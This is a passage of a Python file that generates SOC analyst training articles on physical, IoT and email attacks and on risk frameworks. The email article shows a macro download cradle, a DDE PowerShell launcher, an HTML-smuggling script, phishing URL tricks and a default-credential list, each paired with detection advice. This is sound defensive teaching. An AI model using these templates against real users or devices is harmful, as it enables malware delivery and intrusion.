# Common physical bypass techniques:
# - Lock picking (standard pin tumbler locks)
# - Bump keys (specially cut keys that open many locks)
# - RFID badge cloning (Proxmark, Flipper Zero)
#   - 125 kHz (HID Prox) - easily cloned in seconds
#   - 13.56 MHz (iCLASS, MIFARE) - harder but possible
# - Shim attacks on padlocks
# - Under-door tools to reach interior handles

# Mitigation:
# - High-security locks (Medeco, Abloy Protec)
# - Encrypted RFID credentials (iCLASS SE, SEOS, DESFire EV2/EV3)
# - Regular lock audits and rekeying
# - Tamper-evident seals on critical equipment
```

### Shoulder Surfing
Observing someone entering credentials, PINs, or viewing sensitive data.

**Prevention:**
- Privacy screens on monitors and laptops
- PIN shields on keypads
- Clean desk policy enforcement
- Awareness training

## Physical Security Assessments

**Assessment checklist:**

| Area | Check | Method |
|------|-------|--------|
| Perimeter | Fence integrity, lighting, signage | Walk-around inspection |
| Entry points | Lock quality, badge reader function | Attempt bypass |
| Visitor process | Sign-in, escort, badge return | Social engineering test |
| Tailgating | Can you follow someone in? | Observation/test |
| Server room | Lock, temperature, camera, logs | Physical inspection |
| Waste disposal | Secure shredding, dumpster locks | Dumpster dive test |
| Cable security | Locked wiring closets, conduit | Physical inspection |
| Badge security | Cloning resistance, deprovisioning | Technical test |
| Surveillance | Camera coverage, recording, retention | Coverage mapping |
| Emergency | Exit routes, suppression systems | Fire drill review |

## Convergence: Physical + Logical Security

Modern security operations correlate physical and logical events:

```
# Correlation examples:
# - Badge-in at Building A + VPN login from remote = impossible (compromised creds)
# - After-hours badge access + bulk file downloads = insider threat indicator
# - Failed badge attempts + brute force login attempts = coordinated attack
# - Badge access to server room + new admin account created = physical compromise

# SIEM integration:
# Import physical access logs into SIEM
# Correlate badge events with authentication events
# Alert on anomalies (badge in, but no network login)
```

## Key Takeaways

- Physical access bypasses all logical security controls
- Defense in depth applies to physical security just as it does to network security
- Social engineering is the most common physical security bypass
- Biometrics provide strong authentication but are not infallible
- Environmental controls protect against natural and accidental threats
- Physical and logical security data should be correlated in the SIEM
- Regular physical security assessments are essential
"""
    ))

    # ------------------------------------------------------------------
    # 17. IoT and Embedded Device Security
    # ------------------------------------------------------------------
    articles.append((
        "IoT and Embedded Device Security",
        ["threats", "IoT", "embedded-devices", "OT", "ICS", "MQTT", "firmware", "Shodan"],
        r"""# IoT and Embedded Device Security

## Overview

The Internet of Things (IoT) encompasses billions of connected devices, from smart
thermostats to industrial control systems. These devices dramatically expand the
attack surface because they often run minimal operating systems, lack security
updates, use default credentials, and are deployed in large numbers with minimal
oversight. For SOC analysts, IoT devices represent both a threat vector and a
monitoring blind spot.

## IoT Attack Surface

| Attack Surface | Examples | Risk |
|---------------|----------|------|
| Default credentials | admin/admin, root/root | Botnet recruitment (Mirai) |
| Unencrypted protocols | HTTP, Telnet, MQTT without TLS | Traffic interception |
| Firmware vulnerabilities | Hardcoded keys, buffer overflows | Remote code execution |
| Insecure updates | No signed firmware, HTTP updates | Malicious firmware injection |
| Physical interfaces | UART, JTAG, SPI debug ports | Firmware extraction, modification |
| Cloud backend | Weak API authentication | Account takeover, data exposure |
| Mobile app | Hardcoded API keys, weak auth | Lateral access to device |
| Network services | Open telnet, SSH, UPnP | Unauthorized access |

## Common IoT Vulnerabilities

### Default and Hardcoded Credentials

```
# Mirai botnet used 61 default username/password combinations:
admin:admin
root:root
admin:password
root:123456
admin:1234
guest:guest
support:support
# ... and many vendor-specific defaults

# These credentials are tried via Telnet/SSH on port scans
# A single compromised IoT device joins the botnet in seconds

# Detection: monitor for Telnet/SSH brute force against IoT subnets
# Prevention: change defaults, disable Telnet, enforce strong passwords
```

### Firmware Vulnerabilities

```bash
# Firmware analysis process:
# 1. Download firmware from vendor or extract from device
# 2. Extract filesystem
binwalk -e firmware.bin
# OR
firmware-mod-kit/extract-firmware.sh firmware.bin

# 3. Analyze filesystem
find ./extracted -name "*.conf" -o -name "*.cfg" | xargs grep -i password
strings firmware.bin | grep -i "password\|key\|secret\|token"

# 4. Look for hardcoded credentials
grep -r "admin" ./extracted/etc/
cat ./extracted/etc/shadow

# 5. Check for known vulnerable components
# Search extracted binaries for version strings
# Cross-reference with CVE databases

# Tools: binwalk, firmware-mod-kit, FACT (Firmware Analysis and
# Comparison Tool), Ghidra (reverse engineering)
```

## IoT-Specific Protocols

### MQTT (Message Queuing Telemetry Transport)

Lightweight publish/subscribe messaging protocol widely used in IoT.

```
# MQTT operates on port 1883 (unencrypted) or 8883 (TLS)
# Architecture:
# Publisher --> MQTT Broker --> Subscriber
#              (topics)

# Security issues:
# - No authentication required by default
# - Plaintext transmission on port 1883
# - Wildcard topic subscription (#) exposes all messages
# - No authorization on topics (any client reads any topic)

# Reconnaissance:
mosquitto_sub -h target_broker -t '#' -v
# Subscribes to ALL topics, revealing device data

# Detection: monitor for wildcard subscriptions, unauthenticated connections
# Prevention: require authentication, use TLS (port 8883), implement ACLs
```

### CoAP (Constrained Application Protocol)

REST-like protocol for constrained IoT devices, uses UDP port 5683.

```
# CoAP security issues:
# - UDP-based (no TLS; uses DTLS for security)
# - Often deployed without DTLS
# - Resource discovery via /.well-known/core
# - Amplification attack potential (like DNS)

# Reconnaissance:
coap-client -m get coap://target/.well-known/core
```

### Other IoT Protocols

| Protocol | Port | Use Case | Security Concern |
|----------|------|----------|-----------------|
| Zigbee | 802.15.4 | Home automation | Key extraction, replay attacks |
| Z-Wave | 908 MHz | Smart home | Older versions lack encryption |
| BLE | 2.4 GHz | Wearables, proximity | Pairing vulnerabilities |
| Modbus | 502 | Industrial (ICS) | No authentication whatsoever |
| DNP3 | 20000 | Utilities (SCADA) | Limited security features |
| BACnet | 47808 | Building automation | No built-in authentication |

## OT/ICS Security Basics

Operational Technology (OT) and Industrial Control Systems (ICS) are specialized
IoT environments controlling physical processes.

```
# ICS Architecture (Purdue Model):
Level 5: Enterprise Network (IT)
Level 4: Business Planning (IT/OT DMZ)
Level 3.5: IT/OT DMZ (firewalls, data diodes)
Level 3: Site Operations (historians, SCADA servers)
Level 2: Area Control (HMIs, engineering workstations)
Level 1: Basic Control (PLCs, RTUs, DCS controllers)
Level 0: Physical Process (sensors, actuators, valves)

# Key principle: NEVER connect Level 0-2 directly to the internet
# Use data diodes for one-way data flow where possible
```

**ICS-specific threats:**

| Threat | Impact | Example |
|--------|--------|---------|
| Unauthorized commands | Physical damage | Stuxnet (centrifuge destruction) |
| Safety system tampering | Human safety risk | TRITON/TRISIS (safety controller attack) |
| HMI manipulation | Operator deception | Ukraine power grid attack (2015) |
| Historian data theft | Process intelligence | Espionage campaigns |
| Ransomware on IT/OT | Production shutdown | Colonial Pipeline (2021) |

## Shodan and IoT Reconnaissance

Shodan indexes internet-connected devices and their service banners.

```
# Shodan search queries for exposed IoT:
# Industrial control systems
"Siemens" port:102           # S7 PLCs
"Schneider Electric"         # Modicon PLCs
"port:502" Modbus            # Modbus devices

# Building automation
"BACnet" port:47808          # Building systems

# Cameras
"Server: GoAhead" "realm="  # IP cameras
"Server: SQ-WEBCAM"         # Webcams
has_screenshot:true          # Devices with accessible screens

# Network infrastructure
"cisco" "last-modified"      # Cisco devices
"mikrotik" port:8291         # MikroTik routers

# Default credentials
"default password"           # Devices advertising defaults
"authentication disabled"    # No auth required
```

## Network Segmentation for IoT

```
# Recommended IoT network architecture:
+------------------+
|  Corporate       | <-- Standard IT network
|  Network         |
+--------+---------+
         |
    [Firewall]     <-- Strict rules: IoT cannot reach corporate
         |
+--------+---------+
|  IoT VLAN        | <-- Isolated IoT network
|  (10.99.0.0/16)  |
+--------+---------+
         |
    [IoT Gateway]  <-- Protocol translation, monitoring
         |
+--------+---------+
|  IoT Devices     | <-- No direct internet access
+------------------+

Firewall rules:
- IoT VLAN -> Corporate: DENY ALL
- IoT VLAN -> Internet: DENY ALL (or very limited allowlist)
- IoT VLAN -> IoT Gateway: ALLOW specific protocols only
- Corporate -> IoT Management: ALLOW from jump host only
```

## IoT Security Monitoring for SOC

| Monitor For | Detection Method | Tool |
|------------|-----------------|------|
| New IoT devices on network | DHCP monitoring, NAC | NAC, Forescout |
| Default credential use | Failed auth monitoring | SIEM, honeypots |
| Unusual IoT traffic | Baseline deviation | NDR, Zeek |
| Firmware update anomalies | Change detection | FIM, network monitoring |
| IoT C2 communication | DNS/traffic analysis | DNS monitoring, NDR |
| Protocol anomalies | Deep packet inspection | ICS-specific IDS (Claroty, Nozomi) |

## Key Takeaways

- IoT devices are the weakest link in most networks
- Default credentials remain the number one IoT vulnerability
- Network segmentation is the most effective IoT security control
- OT/ICS environments require specialized security approaches
- Shodan reveals the true scope of exposed IoT devices
- SOC teams need visibility into IoT traffic via dedicated monitoring
- Firmware analysis can reveal hardcoded secrets and vulnerabilities
- IoT protocols often lack built-in security features
"""
    ))

    # ------------------------------------------------------------------
    # 18. Email-Based Attack Vectors Deep Dive
    # ------------------------------------------------------------------
    articles.append((
        "Email-Based Attack Vectors Deep Dive",
        ["attacks", "email", "phishing", "malicious-attachments", "spoofing", "email-headers", "defense"],
        r"""# Email-Based Attack Vectors Deep Dive

## Overview

Email remains the primary initial access vector for cyberattacks, involved in
over 90% of targeted attacks. This article provides a deep technical dive into
email-based attack mechanics, going beyond basic phishing awareness to cover
the specific techniques, evasion methods, and detection approaches SOC analysts
need for email threat investigation.

## Anatomy of a Phishing Email

```
+------------------------------------------------------------------+
| From: "Microsoft Security" <security@micr0soft-alerts.com>       |
| Reply-To: attacker@protonmail.com                                |
| To: victim@company.com                                           |
| Subject: [URGENT] Unusual Sign-in Activity Detected              |
| Date: Wed, 26 Feb 2026 08:15:33 -0500                          |
| X-Mailer: PHPMailer 6.1.4                                       |
| Authentication-Results:                                          |
|   spf=pass (domain micr0soft-alerts.com)                        |
|   dkim=pass (domain micr0soft-alerts.com)                       |
|   dmarc=pass (domain micr0soft-alerts.com)                      |
+------------------------------------------------------------------+
|                                                                  |
|  [Microsoft Logo]                                                |
|                                                                  |
|  Unusual sign-in activity                                        |
|  We detected something unusual about a recent sign-in to        |
|  your Microsoft account.                                         |
|                                                                  |
|  [Review Recent Activity]  <-- hxxps://micr0soft-alerts.com/    |
|                                 auth?redirect=...                |
|                                                                  |
+------------------------------------------------------------------+

Red flags:
1. Typosquatting domain (micr0soft-alerts.com, not microsoft.com)
2. Reply-To different from sender
3. SPF/DKIM pass for ATTACKER'S domain (not Microsoft's)
4. Urgency in subject line
5. Generic content (no personalization)
6. X-Mailer reveals PHPMailer (not Microsoft infrastructure)
```

## Malicious Attachment Techniques

### Office Macro Attacks

```
# Attack chain:
# 1. User opens .docm/.xlsm with malicious VBA macro
# 2. Macro executes on document open (AutoOpen/Document_Open)
# 3. Macro downloads and executes payload

# Common macro techniques:
Sub AutoOpen()
    ' Obfuscated PowerShell download cradle
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -enc " & encoded_payload
    Shell cmd, vbHide
End Sub

# Detection: Sysmon Event ID 1
# Parent: WINWORD.EXE -> Child: powershell.exe or cmd.exe
# This parent-child relationship is almost always malicious
```

### DDE (Dynamic Data Exchange)

```
# No macros needed - uses DDE protocol in Office documents
# Payload embedded in document field codes:
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -ep bypass -c IEX(...)"}

# User sees: "This document contains links that may refer to other files"
# If they click "Yes" twice, payload executes

# Detection: Monitor for Office spawning cmd.exe via DDE
# Prevention: Disable DDE via registry/GPO
```

### ISO/IMG Disk Image Attachments

```
# Used to bypass Mark-of-the-Web (MOTW) protection
# ISO/IMG files mount as virtual drives
# Files inside do NOT inherit MOTW flag
# This means no SmartScreen warning when executing

# Attack chain:
# 1. Email with .iso attachment (or link to download)
# 2. User double-clicks ISO -> Windows mounts as drive
# 3. Inside: .lnk shortcut pointing to malicious .dll or .exe
# 4. User double-clicks shortcut -> payload executes without MOTW warning

# Detection:
# - Sysmon Event ID 1: explorer.exe mounting ISO
# - Execution from mounted drive letter (unusual path)
# - .lnk file executing DLL via rundll32
```

### HTML Smuggling

```html
<!-- Malicious HTML email attachment or link -->
<!-- JavaScript constructs a binary blob and triggers download -->
<html>
<body>
<script>
// Base64-encoded malicious payload
var payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ...";
var binary = atob(payload);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: 'application/octet-stream'});
var link = document.createElement('a');
link.href = URL.createObjectURL(blob);
link.download = "report.zip";
link.click();
</script>
</body>
</html>

<!-- The malicious file is constructed in the browser -->
<!-- Bypasses email gateway scanning (no attachment to scan) -->
<!-- Detection: monitor for JavaScript blob/download patterns -->
```

### Other Attachment Techniques

| Format | Technique | Gateway Bypass |
|--------|-----------|---------------|
| .zip/.7z | Password-protected archive (password in email body) | Evades scanning |
| .one | OneNote with embedded scripts | Newer technique (2023+) |
| .wsf | Windows Script File | Often unblocked |
| .hta | HTML Application | Executes as trusted |
| .svg | SVG with embedded JavaScript | Bypasses image filters |
| .pdf | JavaScript in PDF / embedded links | Trusted file format |
| .lnk | Shortcut to malicious command | Hidden execution |

## Malicious Link Techniques

### URL Obfuscation Methods

```
# 1. Typosquatting
microsoft.com -> micr0soft.com, microsoftt.com, microsoft-login.com

# 2. Subdomain abuse
login.microsoft.com.attacker.com   <-- attacker.com is the real domain

# 3. URL shorteners
bit.ly/3xAbCdE -> hxxps://malicious-site.com/phish

# 4. Open redirect abuse
https://legitimate-site.com/redirect?url=https://attacker.com
# Legitimate domain in visible URL, redirects to attacker

# 5. Data URI
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
# Encodes HTML/JS in the URL itself

# 6. Punycode / IDN homograph
xn--80ak6aa92e.com  ->  Displays as apple.com (Cyrillic characters)

# 7. URL encoding
https://attacker.com/%70%68%69%73%68  ->  /phish

# 8. QR codes in email (quishing)
# Embedded QR code image points to phishing URL
# Bypasses URL scanning (image, not text link)
```

## Email Spoofing Techniques

### Display Name Spoofing
```
From: "John Smith - CEO" <random@attacker.com>
# Display name shows CEO's name, but email domain is attacker's
# Many email clients only show display name by default
```

### Domain Spoofing (no SPF/DKIM/DMARC)
```
From: ceo@target-company.com  (actually sent from attacker's server)
# Works if target-company.com has no SPF/DMARC
# Or DMARC policy is p=none (monitor only, don't reject)
```

### Lookalike Domain
```
# Register similar domain:
target-company.com -> target-c0mpany.com
# Set up proper SPF/DKIM/DMARC for the lookalike domain
# Emails pass all authentication checks for wrong domain
```

### Compromised Account
```
# Actual compromise of legitimate mailbox
# All authentication checks pass legitimately
# Most difficult to detect
# Detection: behavioral analysis, unusual send patterns
```

## Email Header Analysis

**Critical headers for investigation:**

```
# Trace the email path (bottom-to-top in Received headers):
Received: from mail-gateway.company.com (10.0.0.5)
    by exchange.company.com; Wed, 26 Feb 2026 08:15:40 -0500
Received: from sender-smtp.attacker.com (1.2.3.4)
    by mail-gateway.company.com; Wed, 26 Feb 2026 08:15:38 -0500
Received: from localhost (127.0.0.1)
    by sender-smtp.attacker.com; Wed, 26 Feb 2026 13:15:35 +0000

# Authentication results:
Authentication-Results: mail-gateway.company.com;
    spf=fail (sender IP 1.2.3.4 not authorized for domain.com);
    dkim=none;
    dmarc=fail (p=none dis=none)

# Key analysis points:
# 1. First Received header (bottom) shows true origin
# 2. Compare origin IP with claimed sender domain
# 3. Check SPF/DKIM/DMARC results
# 4. Look for X-Originating-IP header
# 5. Check Message-ID domain vs From domain
# 6. Examine Return-Path vs From address
# 7. Check for unusual X-Mailer or User-Agent headers
```

## Email Authentication Deep Dive

| Protocol | Protects Against | Mechanism |
|----------|-----------------|-----------|
| SPF | IP spoofing | DNS TXT record listing authorized sending IPs |
| DKIM | Message tampering | Cryptographic signature in email header |
| DMARC | Domain spoofing | Policy combining SPF + DKIM with reporting |

```
# SPF record example:
v=spf1 ip4:198.51.100.0/24 include:_spf.google.com -all

# DKIM signature header:
DKIM-Signature: v=1; a=rsa-sha256; d=company.com; s=selector1;
    h=from:to:subject:date; bh=...; b=...

# DMARC record example:
v=DMARC1; p=reject; rua=mailto:dmarc-reports@company.com;
    ruf=mailto:dmarc-forensics@company.com; pct=100
```

## Defense Layers

| Layer | Control | What It Stops |
|-------|---------|--------------|
| Pre-delivery | SPF/DKIM/DMARC | Spoofed sender domains |
| Pre-delivery | Email gateway (Proofpoint, Mimecast) | Known malicious content |
| Pre-delivery | Sandbox detonation | Malicious attachments |
| Pre-delivery | URL rewriting | Malicious links (time-of-click check) |
| Delivery | External email banners | User awareness of external senders |
| Delivery | Attachment stripping | Remove high-risk file types |
| Post-delivery | Automated clawback | Remove emails matching new IOCs |
| Post-delivery | User reporting | Phish button for quick reporting |
| Endpoint | Macro blocking | Office macro execution |
| Endpoint | Application guard | Isolate Office documents |
| Human | Security awareness | Reduce click rates |
| Process | Payment verification | Prevent BEC wire fraud |

## SOC Email Investigation Workflow

```
# Step 1: Triage
# - Review email gateway alert or user report
# - Check sender reputation and authentication results
# - Classify: phishing, BEC, malware delivery, spam

# Step 2: Analyze
# - Full header analysis (trace delivery path)
# - Attachment analysis (sandbox, static analysis)
# - URL analysis (reputation, redirect chains, screenshot)
# - Check if payload/URL seen in threat intel feeds

# Step 3: Scope
# - Search for all recipients of the same campaign
# - Message-ID, subject, sender, attachment hash searches
# - Identify who clicked links or opened attachments
# - Check proxy/DNS logs for connections to phishing domains

# Step 4: Contain
# - Quarantine/delete all instances of the email
# - Block sender domain/IP at email gateway
# - Block phishing URLs at web proxy
# - Block IOCs (hashes, IPs, domains) across security stack

# Step 5: Remediate
# - Reset credentials for users who submitted data to phishing
# - Revoke active sessions for compromised accounts
# - Scan endpoints that opened malicious attachments
# - Verify no persistence mechanisms installed

# Step 6: Report
# - Document IOCs for threat intelligence
# - Update detection rules
# - Report metrics (volume, click rate, response time)
```

## Key Takeaways

- Email attacks continuously evolve to bypass security controls
- HTML smuggling and ISO attachments bypass traditional gateway scanning
- Email header analysis is a core SOC analyst skill
- SPF/DKIM/DMARC protect against domain spoofing but not lookalike domains
- Defense requires multiple layers from gateway to endpoint to user awareness
- Automated clawback capability is critical for post-delivery remediation
- QR code phishing (quishing) is an emerging vector bypassing URL scanners
"""
    ))

    return articles


def governance_risk_compliance_articles():
    """Return 16 governance, risk, and compliance articles for SOC analyst knowledge base."""
    articles = []

    # ------------------------------------------------------------------
    # Article 1: Risk Management Fundamentals for Security Teams
    # ------------------------------------------------------------------
    articles.append((
        "Risk Management Fundamentals for Security Teams",
        ["governance", "risk", "risk-management", "risk-assessment", "security-fundamentals"],
        r"""# Risk Management Fundamentals for Security Teams

## Overview

Risk management is the systematic process of identifying, assessing, and treating risks to
organizational assets. As a SOC analyst, understanding risk management helps you prioritize
alerts, justify security investments, and communicate effectively with leadership.

## Core Risk Terminology

| Term | Definition | Example |
|------|-----------|---------|
| **Threat** | Potential cause of an unwanted event | Ransomware group targeting healthcare |
| **Vulnerability** | Weakness that can be exploited | Unpatched Apache Struts server |
| **Asset** | Anything of value to the organization | Customer database, payment system |
| **Likelihood** | Probability a threat exploits a vulnerability | High (actively exploited in the wild) |
| **Impact** | Consequence if the risk materializes | $2M data breach cost, 3-day outage |
| **Risk** | Likelihood x Impact | High likelihood x High impact = Critical risk |
| **Exposure** | Degree to which an asset is at risk | Internet-facing server with known CVE |
| **Control** | Measure that modifies risk | Web application firewall, MFA |

## Risk Assessment Methods

### Qualitative Risk Assessment

Uses descriptive scales rather than numerical values. Best for rapid prioritization.

**Likelihood Scale:**

| Rating | Description | Frequency |
|--------|------------|-----------|
| Very High | Almost certain to occur | Multiple times per year |
| High | Likely to occur | Once per year |
| Medium | Possible but not likely | Once every 2-3 years |
| Low | Unlikely to occur | Once every 5-10 years |
| Very Low | Rare or unprecedented | Less than once per decade |

**Impact Scale:**

| Rating | Financial | Operational | Reputational |
|--------|----------|-------------|-------------|
| Critical | > $10M | Complete shutdown | National media coverage |
| High | $1M - $10M | Major service disruption | Industry-wide awareness |
| Medium | $100K - $1M | Partial service impact | Regional awareness |
| Low | $10K - $100K | Minor inconvenience | Limited awareness |
| Negligible | < $10K | No noticeable effect | No external awareness |

**Risk Matrix (Likelihood x Impact):**

| | Negligible | Low | Medium | High | Critical |
|---|-----------|-----|--------|------|----------|
| **Very High** | Medium | High | High | Critical | Critical |
| **High** | Low | Medium | High | High | Critical |
| **Medium** | Low | Medium | Medium | High | High |
| **Low** | Low | Low | Medium | Medium | High |
| **Very Low** | Low | Low | Low | Medium | Medium |

### Quantitative Risk Assessment

Uses numerical values to calculate risk in financial terms.

**Key Formulas:**

- **Asset Value (AV):** Dollar value of the asset
- **Exposure Factor (EF):** Percentage of asset lost in an incident (0-100%)
- **Single Loss Expectancy (SLE):** AV x EF
- **Annualized Rate of Occurrence (ARO):** Expected frequency per year
- **Annualized Loss Expectancy (ALE):** SLE x ARO

**Worked Example:**

```
Asset: Customer Database
Asset Value (AV):           $5,000,000
Exposure Factor (EF):       40% (partial breach)
Single Loss Expectancy:     $5,000,000 x 0.40 = $2,000,000
Annualized Rate of Occurrence: 0.2 (once every 5 years)
Annualized Loss Expectancy: $2,000,000 x 0.2 = $400,000/year
```

If a control costs $150,000/year and reduces ALE to $100,000, the net savings is $150,000/year.

## Risk Register

A risk register is the central document tracking all identified risks.

**Risk Register Template:**

| ID | Risk Description | Category | Owner | Likelihood | Impact | Risk Rating | Treatment | Status | Review Date |
|----|-----------------|----------|-------|-----------|--------|-------------|-----------|--------|-------------|
| R-001 | Ransomware via phishing | Cyber | CISO | High | Critical | Critical | Mitigate | Open | 2026-03-01 |
| R-002 | Key person dependency | Operational | HR | Medium | High | High | Mitigate | Open | 2026-03-01 |
| R-003 | Cloud misconfiguration | Cyber | Cloud Team | High | High | High | Mitigate | Open | 2026-04-01 |
| R-004 | Physical server theft | Physical | Facilities | Very Low | Medium | Low | Accept | Accepted | 2026-06-01 |

## Risk Treatment Options

| Treatment | Description | When to Use | Example |
|-----------|------------|-------------|---------|
| **Avoid** | Eliminate the activity creating risk | Risk outweighs benefit | Discontinue legacy application |
| **Mitigate** | Apply controls to reduce likelihood or impact | Most common approach | Deploy EDR, implement MFA |
| **Transfer** | Shift risk to a third party | Financial risk is primary concern | Cyber insurance, outsourced SOC |
| **Accept** | Acknowledge and monitor the risk | Cost of treatment exceeds risk | Low-impact, low-likelihood risks |

### Treatment Decision Framework

```
Is the risk above our tolerance threshold?
  |-- No --> ACCEPT (document in risk register, set review date)
  |-- Yes --> Can we eliminate the source of risk?
       |-- Yes, and it is practical --> AVOID
       |-- No --> Can we reduce it to acceptable levels?
            |-- Yes --> MITIGATE (implement controls)
            |-- Partially --> MITIGATE + TRANSFER (controls + insurance)
            |-- No --> TRANSFER (insurance, outsource)
```

## SOC Analyst Relevance

### How Risk Management Affects Daily SOC Work

1. **Alert prioritization:** Risks rated Critical in the register should drive higher-priority
   response to related alerts
2. **Escalation decisions:** Understanding business impact helps determine when to escalate
3. **Threat intelligence:** Map threat intel to risk register entries to update likelihood
4. **Metrics reporting:** Frame SOC metrics in risk reduction terms for leadership
5. **Control validation:** SOC detections are controls; measure their effectiveness

### Practical Checklist for SOC Teams

- [ ] Know your organization's top 10 risks from the risk register
- [ ] Understand which assets are classified as critical
- [ ] Map detection rules to specific risks they address
- [ ] Track risk-related metrics (time to detect threats to critical assets)
- [ ] Report on risk reduction, not just alert volume
- [ ] Participate in risk assessment workshops when invited
- [ ] Update risk assessments when new threat intelligence emerges
- [ ] Document residual risk after incident remediation

## Risk Appetite vs. Risk Tolerance

| Concept | Definition | Set By | Example |
|---------|-----------|--------|---------|
| **Risk Appetite** | Overall amount of risk the organization is willing to pursue | Board/Executive | "We accept moderate cyber risk to enable digital transformation" |
| **Risk Tolerance** | Acceptable deviation from risk appetite | Management | "No single system may have downtime exceeding 4 hours" |
| **Risk Threshold** | Specific trigger point for action | Risk owners | "Escalate when vulnerability count exceeds 50 critical" |

## Key Takeaways

- Risk = Likelihood x Impact; use this formula to prioritize everything you do
- Quantitative assessments (ALE) help justify security spending to leadership
- The risk register is a living document; update it as the threat landscape changes
- SOC analysts are frontline risk managers whether they realize it or not
- Frame your work in terms of risk reduction, not technical metrics alone
"""
    ))

    # ------------------------------------------------------------------
    # Article 2: Security Frameworks Overview NIST ISO CIS
    # ------------------------------------------------------------------
    articles.append((
        "Security Frameworks Overview NIST ISO CIS",
        ["governance", "compliance", "frameworks", "nist", "iso-27001", "cis-controls"],
        r"""# Security Frameworks Overview: NIST, ISO, and CIS

## Overview

Security frameworks provide structured approaches to managing cybersecurity risk. They give
organizations a common language, repeatable processes, and measurable benchmarks. SOC analysts
should understand these frameworks because they shape the controls, detections, and processes
you operate daily.

## NIST Cybersecurity Framework (CSF) 2.0

Released February 2024, NIST CSF 2.0 added a sixth function: Govern.

### The Six Core Functions

| Function | Purpose | Key Activities | SOC Relevance |
|----------|---------|---------------|---------------|
| **Govern (GV)** | Establish cybersecurity strategy and risk management | Risk strategy, roles, policies, oversight | Understand organizational risk appetite |
| **Identify (ID)** | Understand assets and risks | Asset management, risk assessment, supply chain | Know what you are protecting |
| **Protect (PR)** | Implement safeguards | Access control, training, data security | Preventive controls reduce alert volume |
| **Detect (DE)** | Discover cybersecurity events | Continuous monitoring, detection processes | Core SOC function - detection engineering |
| **Respond (RS)** | Take action on incidents | IR planning, communications, mitigation | Incident response and escalation |
| **Recover (RC)** | Restore capabilities | Recovery planning, improvements, comms | Post-incident restoration support |

### NIST CSF Implementation Tiers

| Tier | Name | Description |
|------|------|-------------|
| Tier 1 | Partial | Ad hoc, reactive, limited awareness |
| Tier 2 | Risk-Informed | Risk-aware but not organization-wide |
| Tier 3 | Repeatable | Formal policies, consistent practices |
| Tier 4 | Adaptive | Continuous improvement, lessons learned integrated |

### NIST CSF Profiles

- **Current Profile:** Where you are today
- **Target Profile:** Where you want to be
- **Gap Analysis:** Difference between current and target drives roadmap priorities

## ISO 27001 / 27002

### ISO 27001: Information Security Management System (ISMS)

ISO 27001 is an international standard for establishing, implementing, maintaining, and
continually improving an ISMS. It is certifiable, meaning organizations can be audited
and certified against it.

**Key Components:**

| Clause | Topic | Description |
|--------|-------|-------------|
| 4 | Context | Understanding the organization and interested parties |
| 5 | Leadership | Management commitment and security policy |
| 6 | Planning | Risk assessment and treatment planning |
| 7 | Support | Resources, competence, awareness, communication |
| 8 | Operation | Risk assessment execution, risk treatment |
| 9 | Performance Evaluation | Monitoring, internal audit, management review |
| 10 | Improvement | Nonconformity, corrective action, continual improvement |

### ISO 27002: Control Guidance

ISO 27002 provides detailed guidance on 93 controls organized into four themes:

| Theme | Count | Examples |
|-------|-------|---------|
| Organizational | 37 | Policies, roles, threat intelligence, asset management |
| People | 8 | Screening, awareness, remote working |
| Physical | 14 | Perimeters, entry controls, equipment security |
| Technological | 34 | Access rights, malware protection, logging, encryption |

## CIS Controls v8

The Center for Internet Security (CIS) Controls are a prioritized set of 18 control groups
designed for practical implementation.

### CIS Controls v8 Summary

| Control | Name | IG1 | IG2 | IG3 |
|---------|------|-----|-----|-----|
| 1 | Inventory and Control of Enterprise Assets | Yes | Yes | Yes |
| 2 | Inventory and Control of Software Assets | Yes | Yes | Yes |
| 3 | Data Protection | Yes | Yes | Yes |
| 4 | Secure Configuration of Assets and Software | Yes | Yes | Yes |
| 5 | Account Management | Yes | Yes | Yes |
| 6 | Access Control Management | Yes | Yes | Yes |
| 7 | Continuous Vulnerability Management | - | Yes | Yes |
| 8 | Audit Log Management | - | Yes | Yes |
| 9 | Email and Web Browser Protections | - | Yes | Yes |
| 10 | Malware Defenses | - | Yes | Yes |
| 11 | Data Recovery | Yes | Yes | Yes |
| 12 | Network Infrastructure Management | - | Yes | Yes |
| 13 | Network Monitoring and Defense | - | - | Yes |
| 14 | Security Awareness and Skills Training | Yes | Yes | Yes |
| 15 | Service Provider Management | - | Yes | Yes |
| 16 | Application Software Security | - | Yes | Yes |
| 17 | Incident Response Management | - | Yes | Yes |
| 18 | Penetration Testing | - | - | Yes |

**Implementation Groups (IG):**

- **IG1:** Essential cyber hygiene (small organizations, limited IT staff)
- **IG2:** Mid-size organizations with dedicated IT staff
- **IG3:** Mature organizations with security experts

## Framework Comparison Matrix

| Feature | NIST CSF 2.0 | ISO 27001 | CIS Controls v8 |
|---------|-------------|-----------|-----------------|
| **Type** | Framework | Standard | Controls list |
| **Certifiable** | No | Yes | No (but benchmarks exist) |
| **Scope** | Broad risk management | ISMS management | Technical controls |
| **Best For** | Strategy and communication | Formal certification | Practical implementation |
| **Cost** | Free | Paid standard + audit costs | Free |
| **Prescriptive** | Low (outcome-based) | Medium | High (specific actions) |
| **Regulatory** | US government and beyond | International recognition | Industry best practice |
| **Updates** | Periodic (2014, 2024) | Periodic (2005, 2013, 2022) | Periodic (v7, v7.1, v8) |
| **Maturity Model** | Tiers (1-4) | ISMS maturity | Implementation Groups |

## Which Framework to Use When

| Scenario | Recommended Framework | Rationale |
|----------|----------------------|-----------|
| Starting from scratch, small team | CIS Controls IG1 | Practical, prioritized, free |
| Need certification for customers | ISO 27001 | Only certifiable standard |
| US government or critical infra | NIST CSF | Aligned with federal requirements |
| Building SOC detection program | CIS Controls + NIST CSF Detect | Specific technical guidance |
| Board-level risk communication | NIST CSF | Common language, tier model |
| Multinational organization | ISO 27001 + NIST CSF | International recognition |
| Compliance-driven industry | All three complement each other | Defense in depth of governance |

## Mapping Frameworks Together

Frameworks are complementary, not competing. Here is a simplified mapping:

| NIST CSF Function | ISO 27001 Clause | CIS Controls |
|-------------------|-----------------|--------------|
| Govern | 5 (Leadership), 6 (Planning) | -- |
| Identify | 6.1 (Risk Assessment), 8 (Assets) | 1, 2, 3 |
| Protect | 8.2 (Risk Treatment) | 4, 5, 6, 9, 14 |
